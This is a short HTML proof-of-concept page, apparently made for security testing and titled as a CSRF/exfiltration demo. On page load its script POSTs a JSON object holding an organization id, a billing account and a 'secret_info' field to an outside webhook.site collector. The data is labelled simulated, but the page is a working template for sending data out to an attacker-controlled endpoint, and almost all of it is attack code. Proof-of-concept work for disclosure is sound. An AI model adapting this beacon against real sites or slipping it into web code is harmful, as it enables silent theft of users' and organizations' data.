<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF/Exfiltration PoC Demo</title>
</head>
<body>
  <h2>Exfiltration PoC Demo</h2>
  <pre id="output">Waiting for simulated fetch...</pre>

  <script>
    // Replace this with your actual webhook URL
    const webhookUrl = "https://webhook.site/31610c4c-f3be-4956-8fe1-d51b5bfd470e";

    // Simulated data to demonstrate sending to your webhook
    const simulatedData = {
      organization: "org-round-lab-67110498",
      billing_account: "DEMO_ACCOUNT",
      secret_info: "This is safe demo data"
    };

    async function sendDataToWebhook(data) {
      try {
        const response = await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(data)
        });

        if (response.ok) {
          document.getElementById("output").textContent = "Data successfully sent to webhook:\n" + JSON.stringify(data, null, 2);
        } else {
          document.getElementById("output").textContent = "Failed to send data. HTTP status: " + response.status;
        }
      } catch (err) {
        document.getElementById("output").textContent = "Error sending data: " + err;
      }
    }

    // Run PoC
    sendDataToWebhook(simulatedData);
  </script>
</body>
